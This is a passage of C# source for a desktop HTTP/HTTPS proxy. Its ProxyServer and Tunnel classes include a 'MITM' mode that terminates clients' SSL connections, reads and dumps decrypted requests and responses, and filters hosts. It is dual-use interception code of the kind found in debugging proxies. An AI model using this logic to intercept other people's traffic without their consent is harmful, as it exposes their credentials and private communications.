            if (choice == "y") result = true;
            else if (choice == "n") result = false;
            SetOutputText(outputBuffer);
            outputBuffer = "";
            freezWrite = false;
            SetPrompt(backup);
            choiceMode = false;
            return result;
        }

        private void SetOutputText(string text)
        {
            if (ctx.InvokeRequired)
            {
                StrDelegate c = new StrDelegate(SetOutputText);
                ctx.Invoke(c, new object[] { text });
                return;
            }
            text = text.Replace("\n", Environment.NewLine);
            output.Text = text;
        }

        public string GetPrompt()
        {
            return prefix;
        }

        public void IgnoreNextInput()
        {
            ignoreNext = true;
        }

        public void HideNextInput()
        {
            hideNext = true;
        }

        public void Debug(string text)
        {
            if (isDebug) WriteLine(text);
        }

        public float GetTextSize()
        {
            if (ctx.InvokeRequired)
            {
                ReturnFloatDelegate c = new ReturnFloatDelegate(GetTextSize);
                return (float)ctx.Invoke(c);
            }
            else return input.Font.Size;
        }
    }

    public class ProxyServer : IDisposable, ISettings
    {
        //ISettings Implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "auto_allow") autoAllow = (value == "true") ? true : false;
            if (key == "http_mode") SetMode(StringToMode(value), "http");
            if (key == "https_mode") SetMode(StringToMode(value), "https");
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("auto_allow", (autoAllow) ? "true" : "false");
            xml.WriteElementString("http_mode", ModeToString(httpMode));
            xml.WriteElementString("https_mode", ModeToString(httpsMode));
            xml.WriteEndElement();
        }

        //IDisposable implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);
        
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                if (started)
                {
                    StopServer();
                    server.Dispose();
                }
                if (_timer != null)
                {
                    _timer.Stop();
                    _timer.Dispose();
                    _timer = null;
                }
                ipv4Addr = null;
                console = null;
                clientList = null;
            }

            disposed = true;
        }

        //Proxy Server

        Socket server;
        string ipv4Addr;
        int port;
        int pclimit;
        VConsole console;
        List<Socket> clientList = new List<Socket>();
        bool stopping = false;
        bool started = false;
        Mode httpMode;
        Mode httpsMode;
        Form1 ctx;
        int tunnelCount = 0;
        VDependencyWatcher dw;
        System.Windows.Forms.Timer _timer;

        public bool autoAllow = true;
        public bool autoClean = false;

        public enum Mode : int
        {
            forward = 0,
            MITM = 1,
            Undefined = 2
        }

        struct ReadObj
        {
            public Socket s;
            public byte[] buffer;
            public Tunnel tunnel;
            public Request request;
            public VSslHandler sslHandler;
        }

        public ProxyServer(string ipAddress, int portNumber, int pendingLimit, VConsole consoleMod, Form1 context)
        {
            ipv4Addr = ipAddress;
            port = portNumber;
            pclimit = pendingLimit;
            console = consoleMod;
            ctx = context;
            dw = context.VdwMod;
            dw.AddCondition(() => httpMode == Mode.MITM && !ctx.mitmHttp.started, ctx.CreateLog("MITM mode is set for http, but mitm service is not enabled!", VLogger.LogLevel.warning));
            dw.AddCondition(() => httpsMode == Mode.MITM && !ctx.server.started, ctx.CreateLog("MITM mode is set for https, but mitm service is not enabled", VLogger.LogLevel.warning));
            dw.AddCondition(() => httpsMode == Mode.MITM && !ctx.CertMod.started, ctx.CreateLog("MITM mode is set for https, but SSL Certification service is not started!", VLogger.LogLevel.warning));
            dw.AddCondition(() => ctx.mitmHttp.started && httpMode != Mode.MITM && httpsMode != Mode.MITM, ctx.CreateLog("MITM Service is running but no protocol modes set to MITM mode", VLogger.LogLevel.warning));
            if (autoClean)
            {
                _timer = new System.Windows.Forms.Timer();
                _timer.Tick += new EventHandler(AutoClean);
                _timer.Interval = 10 * 60 * 1000;
                _timer.Start();
            }
        }

        //Public methods

        public void Setup(string ipAddress, int portNumber, int pendingLimit)
        {
            ipv4Addr = ipAddress;
            port = portNumber;
            pclimit = pendingLimit;
        }

        public void StartServer()
        {
            server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ep = null;
            byte[] buffer = new byte[1024];
            if (ipv4Addr != "") ep = CreateEndPoint(ipv4Addr);
            if (ep != null)
            {
                started = true;
                server.Bind(ep);
                server.Listen(pclimit);
                server.BeginAccept(new AsyncCallback(AcceptClient), null);
            }
        }

        public void StopServer()
        {
            stopping = true;

            foreach (Socket s in clientList)
            {
                KillSocket(s, false);
            }

            clientList.Clear();

            if (started)
            {
                if (server.Connected) server.Shutdown(SocketShutdown.Both);
                server.Close();
                server.Dispose();
            }

            ctx.LogMod.Log("Server Stopped!", VLogger.LogLevel.information);

            stopping = false;
            started = false;
        }

        public void ListClients()
        {
            if (stopping)
            {
                console.Debug("Function Call cancelled!");
                return;
            }
            Dictionary<string, int> Clients = new Dictionary<string, int>();

            foreach (Socket sock in clientList)
            {
                IPEndPoint ep = (IPEndPoint)sock.RemoteEndPoint;
                string addr = ep.Address.ToString();
                if (!Clients.ContainsKey(addr)) Clients.Add(addr, 0);
                else Clients[addr] += 1;
            }

            console.WriteLine("=============Client List=============");
            console.WriteLine(Clients.Count + " client(s) connected");
            int counter = 0;

            foreach (KeyValuePair<string, int> kvp in Clients)
            {
                
                console.WriteLine(counter + "\t" + kvp.Key + "\t+" + kvp.Value + " socket(s)");
                counter++;
            }

            console.WriteLine("==========End Of Client List=========");
        }

        public void KillSocket(Socket client, bool autoRemove = true)
        {
            if (autoRemove && clientList != null) clientList.Remove(client);

            try
            {
                client.Shutdown(SocketShutdown.Both);
                client.Disconnect(false);
            }
            catch (Exception)
            {
                Console.WriteLine("graceful killsocket failed!");
            }
            client.Close();
            client.Dispose();
        }

        public void Kick(int id)
        {
            if (stopping) return;

            if (id >= clientList.Count)
            {
                ctx.LogMod.Log("Invalid client id!", VLogger.LogLevel.error);
                return;
            }

            KillSocket(clientList[id]);
            ctx.LogMod.Log("Client kicked from the server", VLogger.LogLevel.information);
        }

        public void CleanSockets()
        {
            List<Socket> copy = ctx.ListCopy(clientList);
            bool result = true;
            foreach (Socket socket in copy)
            {
                try
                {
                    KillSocket(socket);
                }
                catch (Exception)
                {
                    console.Debug("Clean Sockets failed!");
                    result = false;
                }
            }

            if (result)
            {
                ctx.LogMod.Log("All client disconnected from server", VLogger.LogLevel.information);
            }
            else
            {
                ctx.LogMod.Log("Some clients failed to disconnect from server!", VLogger.LogLevel.warning);
            }

            Array.Clear(copy.ToArray(), 0, copy.Count);
        }

        public void SetMode(Mode mode, string protocol)
        {
            if (protocol == "http") httpMode = mode;
            if (protocol == "https") httpsMode = mode;
        }

        public Mode GetMode(string protocolName)
        {
            protocolName = protocolName.ToLower();
            if (protocolName == "http") return httpMode;
            else if (protocolName == "https") return httpsMode;
            else return Mode.Undefined;
        }

        public void PrintModes()
        {
            console.WriteLine("==Proxy Server Protocol Modes==");
            console.WriteLine("HTTP: " + ModeToString(httpMode));
            console.WriteLine("HTTPs: " + ModeToString(httpsMode));
            console.WriteLine("");
        }

        //Private methods

        private void AutoClean(object sender, EventArgs e)
        {
            CleanSockets();
        }

        private void AcceptClient(IAsyncResult ar)
        {
            Socket client = null;
            try
            {
                client = server.EndAccept(ar);
            }
            catch (Exception e)
            {
                //console.Debug("[ERROR] Can't receive pending connactions\n" + e.Message);
                return;
            }

            IPEndPoint client_ep = (IPEndPoint)client.RemoteEndPoint;
            string remoteAddress = client_ep.Address.ToString();
            string remotePort = client_ep.Port.ToString();

            bool allow;
            if (!autoAllow) allow = console.ChoicePrompt("\n[IN] Connection " + remoteAddress + ":" + remotePort + "\nDo you want to allow connection");
            else allow = true;

            if (allow)
            {
                clientList.Add(client);
                ReadObj obj = new ReadObj();
                obj.buffer = new byte[1024];
                obj.s = client;
                client.BeginReceive(obj.buffer, 0, obj.buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), obj);
                //console.Debug("Read started");
                //console.WriteLine("[ALLOW] " + remoteAddress + ":" + remotePort + " Connected to " + ipv4Addr + ":" + port);
            }
            else
            {
                KillSocket(client);
                ctx.LogMod.Log("[REJECT] " + remoteAddress + ":" + remotePort, VLogger.LogLevel.information);
            }

            if (!stopping) server.BeginAccept(new AsyncCallback(AcceptClient), null);
            //context.Prompt();
        }

        private void ReadPackets(IAsyncResult ar)
        {
            //Console.WriteLine("Packet received at: " + DateTime.Now + " : " + DateTime.Now.Millisecond);
            ReadObj obj = (ReadObj) ar.AsyncState;
            Socket client = obj.s;
            byte[] buffer = obj.buffer;
            int read = -1;
            try
            {
                read = client.EndReceive(ar);
            }
            catch (Exception e)
            {
                KillSocket(client);
                ctx.LogMod.Log("[DISCONNECT] Client Disconnected from server", VLogger.LogLevel.information);
                return;
            }
            if (read == 0)
            {
                try { if (client.Connected) client.BeginReceive(obj.buffer, 0, obj.buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), obj); }
                catch (Exception e)
                {
                    KillSocket(client);
                    Console.WriteLine("Client aborted session!" + Environment.NewLine + e.Message);
                }
                return;
                /*KillSocket(client);
                Console.WriteLine("Client ended do to sending empty arrays");
                return;*/
            }
            string text = Encoding.ASCII.GetString(buffer, 0, read);
            //if (text != "") console.Debug("Text Sent: " + text);
            Request r;
            bool sslHandlerStarted = false;

            if (obj.request != null)
            {
                if (obj.request.notEnded)
                {
                    string des = obj.request.full;
                    des += text;
                    r = new Request(des, console);
                }
                else r = new Request(text, console);
            }
            else r = new Request(text, console);
            //r.Print();
            if (!r.notEnded && !r.bogus)
            {
                ctx.LogMod.Log("<target> [HTTP]", VLogger.LogLevel.request, r);

                if (obj.tunnel != null)
                {
                    if (obj.tunnel.CheckHost(r) && !obj.tunnel.tunnelDestroyed)
                    {
                        obj.tunnel.UpdateProtocolMode("http", httpMode);
                        obj.tunnel.UpdateProtocolMode("https", httpsMode);
                        obj.tunnel.UpdateRequest(r);
                        obj.tunnel.UpdateUserClient(client);
                        obj.tunnel.Send(text);
                    }
                    else
                    {
                        tunnelCount++;
                        Tunnel t = new Tunnel(Tunnel.Mode.HTTP, httpMode, httpsMode, r, ctx, client, console, tunnelCount);
                        t.CreateTunnel();
                        t.AutoSend();
                        obj.tunnel.DestroyTunnel(obj.tunnel);
                        obj.tunnel = t;
                    }
                }
                else
                {
                    tunnelCount++;
                    Tunnel t = new Tunnel(Tunnel.Mode.HTTP, httpMode, httpsMode, r, ctx, client, console, tunnelCount);
                    t.CreateTunnel();
                    if (t.sslRead)
                    {
                        //MITM mode is already filtered at CreateTunnel() method
                        string host = t.GetHost();
                        NetworkStream clientNS = new NetworkStream(client);
                        VSslHandler vsh = new VSslHandler(ctx, console);
                        VSslHandler.Error errCode = vsh.InitSslStream(clientNS, host);
                        if (errCode != VSslHandler.Error.Success)
                        {
                            ctx.LogMod.Log("Init SSL Stream failed", VLogger.LogLevel.error);
                        }
                        else
                        {
                            sslHandlerStarted = true;
                            vsh.tunnel = t;
                            vsh.InitAsyncRead();
                            obj.sslHandler = vsh;
                            t.AddSSLHandler(vsh);
                            return;
                        }
                    }
                    t.AutoSend();
                    obj.tunnel = t;
                }
            }
            else if (r.notEnded) obj.request = r;
            else if (r.bogus)
            {
                if (obj.tunnel != null)
                {
                    if (obj.tunnel.protocol == Tunnel.Mode.HTTPs && !obj.tunnel.tunnelDestroyed)
                    {
                        if (httpsMode == Mode.forward)
                        {
                            obj.tunnel.UpdateProtocolMode("http", httpMode);
                            obj.tunnel.UpdateProtocolMode("https", httpsMode);
                            obj.tunnel.UpdateUserClient(client);
                            obj.tunnel.Send(buffer, 0, read);
                        }
                        else
                        {
                            if (obj.sslHandler != null)
                            {
                                byte[] ctBytes = obj.sslHandler.ReadSslStream();
                                string nText = Encoding.ASCII.GetString(ctBytes, 0, ctBytes.Length);
                                r = new Request(nText, console);
                                if (!r.bogus && !r.notEnded)
                                {
                                    ctx.LogMod.Log("<target> [HTTPS]", VLogger.LogLevel.request, r);
                                    obj.tunnel.UpdateProtocolMode("http", httpMode);
                                    obj.tunnel.UpdateProtocolMode("https", httpsMode);
                                    obj.tunnel.Send(ctBytes, 0, ctBytes.Length);
                                }
                            }
                        }
                    }
                }
            }
            Array.Clear(buffer, 0, buffer.Length);
            try { if (client.Connected && !sslHandlerStarted) client.BeginReceive(obj.buffer, 0, obj.buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), obj); }
            catch (Exception e)
            {
                KillSocket(client);
                Console.WriteLine("Client aborted session!" + Environment.NewLine + e.Message);
            }
        }

        private IPEndPoint CreateEndPoint(string ep_addr)
        {
            IPEndPoint result;
            switch (ep_addr)
            {
                case "loopback":
                    result = new IPEndPoint(IPAddress.Loopback, port);
                    break;
                case "any":
                    result = new IPEndPoint(IPAddress.Any, port);
                    break;
                case "localhost":
                    result = new IPEndPoint(IPAddress.Parse("127.0.0.1"), port);
                    break;
                default:
                    result = new IPEndPoint(IPAddress.Parse(ipv4Addr), port);
                    break;
            }

            return result;
        }

        //Public static methods

        public static Mode StringToMode(string input)
        {
            input = input.ToLower();
            if (input == "mitm" || input == "man-in-the-middle") return Mode.MITM;
            if (input == "forward" || input == "normal") return Mode.forward;
            return Mode.Undefined;
        }

        public static string ModeToString(Mode mode)
        {
            if (mode == Mode.forward) return "forward";
            else if (mode == Mode.MITM) return "mitm";
            else return "undefined";
        }
    }

    public class Tunnel : IDisposable
    {

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                req = null;
                try
                {
                    s.Shutdown(SocketShutdown.Both);
                    s.Disconnect(false);
                }
                catch (Exception)
                {
                    Console.WriteLine("Closing tunnel ungracefully");
                }

                s.Close();
                s.Dispose();
                s = null;
                //ctx = null;
                _host = null;
                Array.Clear(buffer, 0, buffer.Length);
                console = null;
                client = null;
                forwardFails = 0;
                if (req != null) req.Dispose();
                req = null;
                tunnelDestroyed = true;
            }

            disposed = true;
        }

        //Proxy Tunnel

        public Mode protocol { get; private set; }
        Request req;
        Socket s;
        Form1 ctx;
        string _host;
        public bool autoForward = true;
        byte[] buffer = new byte[50000];
        VConsole console;
        ProxyServer.Mode http = ProxyServer.Mode.MITM;
        ProxyServer.Mode https = ProxyServer.Mode.MITM;
        Socket client;
        VLogger logger;
        int forwardFails = 0;
        public bool tunnelDestroyed { get; private set; } = false;
        int tunnelID = 0;
        VSslHandler vsh = null;
        SslStream sslClient = null;
        private string _IPAddress = "";

        public bool sslRead = false;

        public enum Mode : int
        {
            HTTP = 1,
            HTTPs = 2
        }

        public Tunnel(Mode protMode, ProxyServer.Mode httpMode, ProxyServer.Mode httpsMode, Request rhttp, Form1 context, Socket httpClient, VConsole con, int id)
        {
            protocol = protMode;
            http = httpMode;
            https = httpsMode;
            req = rhttp;
            ctx = context;
            console = con;
            client = httpClient;
            logger = ctx.LogMod;
            tunnelID = id;
        }

        public string GetHost()
        {
            return _host;
        }

        public bool CheckHost(Request r)
        {
            string chk = r.headers["Host"];
            if (chk == _host) return true;
            return false;
        }

        public void UpdateRequest(Request r)
        {
            req = r;
            if (ctx.mitmHttp.started) ctx.mitmHttp.DumpRequest(req);
        }

        public void UpdateProtocolMode(string protocolName, ProxyServer.Mode mode)
        {
            if (protocolName == "http") http = mode;
            else if (protocolName == "https") https = mode;
        }

        public void AddSSLHandler(VSslHandler sh)
        {
            vsh = sh;
        }

        public void CreateTunnel()
        {
            s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            string host = req.headers["Host"];
            if (ctx.mitmHttp.started)
            {
                ctx.mitmHttp.DumpRequest(req);
            }
            console.Debug("Header: " + req.method + " " + req.target + " " + req.version);
            string ip = "";
            if (req.method == "CONNECT")
            {
                host = host.Replace(":443", "");
                protocol = Mode.HTTPs;
                logger.Log(" was sent to <target>", VLogger.LogLevel.request, req);
                //console.Debug("https, connect request");
            }

            if (((protocol == Mode.HTTP && http == ProxyServer.Mode.MITM) || (protocol == Mode.HTTPs && https == ProxyServer.Mode.MITM)) && ctx.mitmHttp.started) //only block if mitm is set
            {
                bool hostResult = ctx.mitmHttp.CheckHost(req);
                if (hostResult)
                {
                    DestroyTunnel(this);
                    return;
                } //Dispose tunnel when host is blocked
            }

            /*if (host.EndsWith(":443"))
            {
                host = host.Replace(":443", String.Empty);
                protocol = Mode.HTTPs;
            }*/
            if (ctx.IpVerification(host)) ip = host;
            else
            {
                try { ip = Dns.GetHostAddresses(host)[0].ToString(); }
                catch (Exception ex)
                {
                    Console.WriteLine("Tunnel error in DNS resolve\n" + ex.Message);
                    return;
                }
            }

            if (ctx.mitmHttp.started)
            {
                if (ctx.mitmHttp.CheckIP(ip))
                {
                    DestroyTunnel(this);
                    return;
                } // Tunnel dispose when ip is blocked
            }

            try
            {
                if (protocol == Mode.HTTP) s.Connect(IPAddress.Parse(ip), 80);
                if (protocol == Mode.HTTPs)
                {
                    s.Connect(IPAddress.Parse(ip), 443);
                    if (https == ProxyServer.Mode.MITM)
                    {
                        GenerateVerify();
                        sslRead = true;
                    }
                }

                _IPAddress = ip;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Tunnel to " + ip + " failed!");
                if (protocol == Mode.HTTP) Generate404();
                return;
            }

            _host = host;
            if (autoForward == true && !sslRead)
            {
                ResponseObj ro = new ResponseObj();
                ro.s = s;
                ro.resp = null;
                s.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), ro);
            }

            if (protocol == Mode.HTTPs && s.Connected && req.method == "CONNECT" && !sslRead)
            {
                GenerateVerify();
            }
        }

        private void GenerateVerify()
        {
            string verifyResponse = "HTTP/1.1 200 OK Tunnel Created\r\nTimestamp: " + DateTime.Now + "\r\nProxy-Agent: ah101\r\n\r\n";
            byte[] resp = Encoding.ASCII.GetBytes(verifyResponse);
            if (s.Connected || https == ProxyServer.Mode.MITM) client.Send(resp, 0, resp.Length, SocketFlags.None);
            console.Debug("veriy request sent!");
        }

        public void UpdateUserClient(Socket newClient)
        {
            client = newClient;
        }

        struct ResponseObj
        {
            public Socket s;
            public Response resp;
        }

        private void ReadPackets(IAsyncResult ar)
        {
            ResponseObj o = (ResponseObj)ar.AsyncState;
            Socket self = o.s;
            int read = -1;
            try
            {
                read = self.EndReceive(ar);
            }
            catch (Exception e)
            {
                //console.Debug("Tunnel can't read packets: " + e.Message);
                return;
            }

            string text = Encoding.ASCII.GetString(buffer, 0, read);

            if (protocol == Mode.HTTP)
            {
                if (http == ProxyServer.Mode.forward)
                {
                    try
                    {
                        if (client.Connected) client.Send(buffer, 0, read, SocketFlags.None);
                        if (forwardFails > 0) forwardFails = 0;
                    }
                    catch (Exception ex)
                    {
                        //ctx.server.KillSocket(client);
                        Console.WriteLine("Tunnel error in data forward HTTP\n" + ex.Message);
                        forwardFails += 1;
                    }
                   // Console.WriteLine("Response sent to client at: " + DateTime.Now + " : " + DateTime.Now.Millisecond);
                    //console.Debug("Sent");
                }

                if (http == ProxyServer.Mode.MITM)
                {
                    try
                    {
                        /*Console.WriteLine("Tunnel id: " + tunnelID);
                        Console.WriteLine("Request target: " + req.target);*/
                        byte[] readBytes = new byte[read];
                        Array.Copy(buffer, readBytes, read);
                        Response r = null;
                        bool skip = false;

                        if (o.resp != null && o.resp.skip)
                        {
                            r = o.resp;
                            skip = true;
                        }

                        if (o.resp != null && o.resp.notEnded && !skip)
                        {
                            console.Debug("continuing previous response");
                            r = o.resp;
                            r.PushEnd(readBytes);
                        }
                        else if (!skip)
                        {
                            r = new Response(text, readBytes, console, ctx.mitmHttp);
                            r.SetManager(ctx.vf);
                            r.BindFilter("resp_mime", "mime_white_list");
                            r.BindFilter("resp_mime_block", "mime_skip_list");
                            r.Serialize();
                            console.Debug("new response created");
                        }

                        if (r != null && r.skip)
                        {
                            o.resp = r;
                            client.Send(buffer, 0, read, SocketFlags.None);
                            if (forwardFails > 0) forwardFails = 0;
                        }

                        if (!r.notEnded && !r.skip && !skip)
                        {
                            //logger.Log("At " + r.headers["Date"], VLogger.LogLevel.response, null, r);
                            //byte[] newBytes = r.Deserialize();
                            if (ctx.mitmHttp.started)
                            {
                                string target = req.target;
                                if (target.Contains("?")) target = target.Substring(0, target.IndexOf("?"));
                                ctx.mitmHttp.DumpResponse(r, target);
                            }
                            r.Deserialize(new NetworkStream(client), req);
                            logger.Log(r.body.Length.ToString() + " bytes sent", VLogger.LogLevel.response, null, r);
                            r.Dispose();
                            //Console.WriteLine(r.headers["Content-Type"]);
                            //if (client.Connected) client.Send(buffer, 0, read, SocketFlags.None);
                            if (forwardFails > 0) forwardFails = 0;
                            o.resp = null;
                        }
                        else
                        {
                            console.Debug("Response is not ended");
                            o.resp = r;
                        }
                    }
                    catch (Exception ex)
                    {
                        //ctx.server.KillSocket(client);
                        /*Console.WriteLine("Tunnel error in data MITM HTTP\n" + ex.Message);
                        Console.WriteLine("\n" + ex.StackTrace + "\n");*/
                        forwardFails += 1;
                    }
                }
            }

            if (protocol == Mode.HTTPs)
            {
                if (https == ProxyServer.Mode.forward)
                {
                    try
                    {
                        client.Send(buffer, 0, read, SocketFlags.None);
                        if (forwardFails > 0) forwardFails = 0;
                    }
                    catch (Exception ex)
                    {
                        //ctx.server.KillSocket(client);
                        Console.WriteLine("Tunnel error in data forward HTTPs\n" + ex.Message);
                        forwardFails += 1;
                    }
                }
            }

            Array.Clear(buffer, 0, buffer.Length);
            try { if (!tunnelDestroyed) self.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), o); }
            catch (Exception ex)
            {
                Console.WriteLine("Tunnel error in initiating the async read of self\n" + ex.Message);
            }

            if (forwardFails >= 10)
            {
                DestroyTunnel(this);
            }
        }

        private void ReadSslStream(IAsyncResult ar)
        {
            int bytesRead = 0;
            Response resp = (Response) ar.AsyncState;
            try
            {
                bytesRead = sslClient.EndRead(ar);
            }
            catch (Exception)
            {
                return;
            }

            if (protocol != Mode.HTTPs || https != ProxyServer.Mode.MITM) return;
            if (bytesRead > 0)
            {
                byte[] buf = new byte[bytesRead];
                Array.Copy(buffer, buf, bytesRead);
                string text = Encoding.ASCII.GetString(buf);
                bool supressPushEnd = false;
                if (resp == null)
                {
                    resp = new Response(text, buf, console, ctx.mitmHttp);
                    resp.SetManager(ctx.vf);
                    resp.BindFilter("resp_mime", "mime_white_list");
                    resp.BindFilter("resp_mime_block", "mime_skip_list");
                    resp.Serialize();
                    supressPushEnd = true;
                }
                else
                {
                    if (resp.bogus)
                    {
                        string prevText = resp.fullText;
                        string newText = prevText + text;
                        byte[] newBuf = new byte[resp.fullBytes.Length + buf.Length];
                        Array.ConstrainedCopy(resp.fullBytes, 0, newBuf, 0, resp.fullBytes.Length);
                        Array.ConstrainedCopy(buf, 0, newBuf, resp.fullBytes.Length, buf.Length);
                        resp = new Response(newText, newBuf, console, ctx.mitmHttp);
                        resp.SetManager(ctx.vf);
                        resp.BindFilter("resp_mime", "mime_white_list");
                        resp.BindFilter("resp_mime_block", "mime_skip_list");
                        resp.Serialize();
                        supressPushEnd = true;
                    }
                }

                if (resp.skip)
                {
                    vsh.WriteSslStream(buf);
                }

                if (resp.notEnded && !resp.skip && !supressPushEnd)
                {
                    resp.PushEnd(buf);
                }

                if (!resp.notEnded && !resp.skip && !resp.bogus)
                {
                    if (ctx.mitmHttp.started)
                    {
                        string target = req.target;
                        if (target.Contains("?")) target = target.Substring(0, target.IndexOf("?"));
                        ctx.mitmHttp.DumpResponse(resp, target);
                    }
                    resp.Deserialize(null, req, vsh);
                    ctx.LogMod.Log(resp.body.Length.ToString() + " bytes sent", VLogger.LogLevel.response, null, resp);
                }
            }

            try { if (s.Connected) sslClient.BeginRead(buffer, 0, buffer.Length, new AsyncCallback(ReadSslStream), resp); }
            catch (Exception)
            {
                return;
            }
        }

        public delegate void DestroyTunnelCallback(Tunnel proxyTunnel);

        public void DestroyTunnel(Tunnel proxyTunnel)
        {
            if (proxyTunnel.tunnelDestroyed) return;
            if (ctx.InvokeRequired)
            {
                DestroyTunnelCallback c = new DestroyTunnelCallback(DestroyTunnel);
                ctx.Invoke(c, new object[] { proxyTunnel });
                return;
            }
            else
            {
                proxyTunnel.Dispose();
                proxyTunnel = null;
            }
        }

        public string FormatRequest(Request r)
        {
            if (tunnelDestroyed) return null;

            if (_host == null)
            {
                Generate404();
                return null;
            }
            string toSend = r.Deserialize();
            List<String> lines = toSend.Split('\n').ToList();
            lines[0] = lines[0].Replace("http://", String.Empty);
            lines[0] = lines[0].Replace("https://", String.Empty);
            lines[0] = lines[0].Replace(_host, String.Empty);
            toSend = "";
            foreach (string line in lines)
            {
                toSend += line + "\n";
            }

            return toSend;
        }

        private void Generate404()
        {
            string text = "HTTP/1.1 404 Not Found\r\nTimestamp: " + DateTime.Now + "\r\nProxy-Agent:ah101\r\n\r\n";
            byte[] buf = Encoding.ASCII.GetBytes(text);
            client.Send(buf, 0, buf.Length, SocketFlags.None);
        }

        public void AutoSend()
        {
            if (protocol == Mode.HTTPs) return;
            string toSend = FormatRequest(req);
            if (toSend == null) return;
            Send(toSend);
        }

        public void Send(string data)
        {
            if (protocol == Mode.HTTPs && https == ProxyServer.Mode.MITM)
            {
                if (sslClient == null)
                {
                    NetworkStream ns = new NetworkStream(s);
                    SslStream ssl = new SslStream(ns);
                    sslClient = ssl;
                }

                if (!sslClient.IsAuthenticated)
                {
                    sslClient.AuthenticateAsClient(_host);
                    if (sslClient.IsAuthenticated) sslClient.BeginRead(buffer, 0, buffer.Length, new AsyncCallback(ReadSslStream), null);
                }

                byte[] buf = Encoding.GetEncoding("ISO-8859-1").GetBytes(data);
                try { sslClient.Write(buf, 0, buf.Length); }
                catch (Exception)
                {
                    sslClient.Close();
                    sslClient.Dispose();
                    sslClient = null; // <-- forcing the function to init a reconnect
                    Send(data); // calling the same function with the same data, but now with sslClient set to null
                    return;
                }
                console.Debug("SSL data sent: \r\n" + data);
                return;
            }

            byte[] _buffer = Encoding.GetEncoding("ISO-8859-1").GetBytes(data);
            try { s.Send(_buffer, _buffer.Length, SocketFlags.None); }
            catch (Exception ex)
            {
                ctx.server.KillSocket(s, false); // this client is not in the list, don't remove it
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                s.Connect(_IPAddress, 80);
                ResponseObj ro = new ResponseObj();
                ro.s = s;
                ro.resp = null;
                s.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(ReadPackets), ro);
                Send(data);
            }
        }

        public void Send(byte[] data, int offset, int length = 0)
        {
            if (length == 0) length = data.Length;
            try { s.Send(data, offset, length, SocketFlags.None); }
            catch (Exception ex)
            {
                Console.WriteLine("Tunnel send error\n" + ex.Message);
            }
        }

        public byte[] Read()
        {
            byte[] buffer = new byte[1024];
            int read = s.Receive(buffer, 0, buffer.Length, SocketFlags.None);
            byte[] recv = new byte[read];
            Array.Copy(buffer, recv, read);
            Array.Clear(buffer, 0, buffer.Length);
            return recv;
        }
    }

    public class Request : IDisposable
    {
        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                full = null;
                console = null;
                target = null;
                method = null;
                version = null;
                htmlBody = null;
                headers.Clear();
                headers.Dispose();
                headers = null;
            }

            disposed = true;
        }

        public string full;
        VConsole console;
        public bool bogus = false;
        public bool notEnded = false;
        public string target;
        public string method;
        public string version;
        public string htmlBody;
        //public Dictionary<string, string> headers = new Dictionary<string, string>();
        public VDictionary headers = new VDictionary();

        public Request(string req, VConsole ConMod, bool sslMode = false)
        {
            full = req;
            console = ConMod;
            Serialize(sslMode);
        }

        public void Serialize(bool fromSslStream = false)
        {
            if (full == "")
            {
                bogus = true;
                return;
            }
            if (!full.EndsWith("\r\n\r\n") && fromSslStream) notEnded = true; //setting only when requests are marked to allow normal (not MITM) https packets even if they are not ending with \r\n\r\n

            try
            {
                string infoLine = full.Split('\n')[0].Replace("\r", String.Empty);
                string[] iParts = infoLine.Split(' ');
                method = iParts[0];
                target = iParts[1];
                version = iParts[2];
                headers = new VDictionary();
                string[] data = full.Split('\n');
                bool isBody = false;
                string nl = Environment.NewLine;
                for (int i = 1; i < data.Length; i++)
                {
                    string line = data[i].Replace("\r", String.Empty);
                    if (line == "")
                    {
                        isBody = true;
                        continue;
                    }

                    if (!isBody)
                    {
                        //Add headers
                        string hName = line.Substring(0, line.IndexOf(':'));
                        string hValue = line.Substring(line.IndexOf(':') + 2, line.Length - line.IndexOf(':') - 2);
                        headers.Add(hName, hValue);
                    }
                    else
                    {
                        if ((i + 1) < data.Length) htmlBody += line + nl;
                        else if ((i + 1) == data.Length) htmlBody += line;
                    }
                }

                //Add ssl packet filter
                if (!version.Contains("HTTP")) bogus = true;
            }
            catch (Exception)
            {
                //console.Debug("Bogus Request (Ignored)");
                bogus = true;
            }
        }

        public void Print()
        {
            if (bogus)
            {
                //console.WriteLine("[WARNING] Bogus Packet Detected!");
                return;
            }
            console.WriteLine("HTTP Request:");
            console.WriteLine("\t\tMethod: " + method);
            console.WriteLine("\t\tURL: " + target);
            console.WriteLine("\t\tVersion: " + version);
        }

        public string Deserialize()
        {
            string nl = Environment.NewLine;
            string request = method + " " + target + " " + version + nl;
            for (int i = 0; i < headers.Count; i++)
            {
                string hName = headers.Keys.ToArray()[i];
                string hValue = headers.Values.ToArray()[i];
                string line = hName + ": " + hValue;
                request += line + nl;
            }
            request += nl;
            request += htmlBody;
            return request;
        }
